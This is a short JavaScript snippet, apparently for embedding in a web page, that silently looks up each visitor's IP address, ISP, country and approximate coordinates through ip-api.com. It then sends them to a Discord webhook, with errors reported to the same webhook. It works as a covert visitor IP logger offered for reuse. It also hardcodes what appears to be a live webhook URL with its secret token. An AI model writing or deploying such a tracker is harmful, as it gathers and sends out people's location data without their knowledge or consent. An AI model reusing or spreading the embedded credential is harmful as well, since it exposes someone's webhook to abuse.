// Replace with your Discord webhook URL
const webhookURL =
  "https://discord.com/api/webhooks/1283875492973248595/_PAtLBSg3Tn5_zUg7LMktzSejReNgeXcGTGH_PhsAMQaiSIjJjZns6i9PEmLyF-21miR";

// Function to send error messages to Discord
function sendErrorToDiscord(errorMessage) {
  const errorEmbed = {
    embeds: [
      {
        title: "Error in Visitor Info Logging",
        description: errorMessage,
        color: 15158332, // Red color
        timestamp: new Date()
      }
    ]
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(errorEmbed)
  })
    .then(() => console.log("Error message sent to Discord"))
    .catch(err => console.error("Failed to send error to Discord: ", err));
}

// Fetch IP and location information
fetch("https://ip-api.com/json/")
  .then(response => {
    if (!response.ok) {
      throw new Error(`API responded with status ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    const { query: ip, isp, country, lat, lon } = data;

    // Prepare Discord embed
    const embed = {
      embeds: [
        {
          title: "Website Visitor Info",
          color: 3447003, // Blue color
          fields: [
            { name: "IP Address", value: ip, inline: true },
            { name: "ISP", value: isp, inline: true },
            { name: "Country", value: country, inline: true },
            { name: "Latitude", value: lat.toString(), inline: true },
            { name: "Longitude", value: lon.toString(), inline: true }
          ],
          timestamp: new Date()
        }
      ]
    };

    // Send data to Discord webhook
    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    })
      .then(() => console.log("Visitor data sent to Discord"))
      .catch(err => {
        console.error("Error sending to Discord: ", err);
        sendErrorToDiscord(`Failed to send visitor data to Discord: ${err.message}`);
      });
  })
  .catch(err => {
    console.error("Error fetching IP data: ", err);
    sendErrorToDiscord(`Failed to fetch IP data: ${err.message}`);
  });
